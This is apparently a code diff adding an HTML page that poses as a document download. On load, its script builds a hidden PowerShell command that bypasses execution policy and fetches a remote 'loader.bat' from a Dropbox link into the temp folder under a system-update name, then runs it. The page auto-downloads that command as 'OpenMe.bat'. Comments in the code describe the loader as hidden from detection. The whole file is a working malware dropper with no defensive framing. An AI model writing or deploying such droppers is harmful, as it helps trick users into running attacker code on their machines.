@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h3>Downloading Document... Please wait.</h3>
+    <script>
+        // The PowerShell command to run your loader
+        // This is encoded to avoid detection
+        const cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p='$env:TEMP\\sys_upd.bat'; iwr 'https://www.dropbox.com/scl/fi/hb4bx2x1mhbhkq27dc203/loader.bat?rlkey=gidnqfc4vs25lrldehf3vxco8&st=vyj67ryz&dl=1' -OutFile $p; Start-Process $p\"";
+        
+        // Create a blob that looks like a batch file
+        const blob = new Blob([cmd], { type: 'text/plain' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        
+        a.href = url;
+        a.download = 'OpenMe.bat'; // The browser will download this
+        document.body.appendChild(a);
+        a.click();
+    </script>
+</body>
+</html>
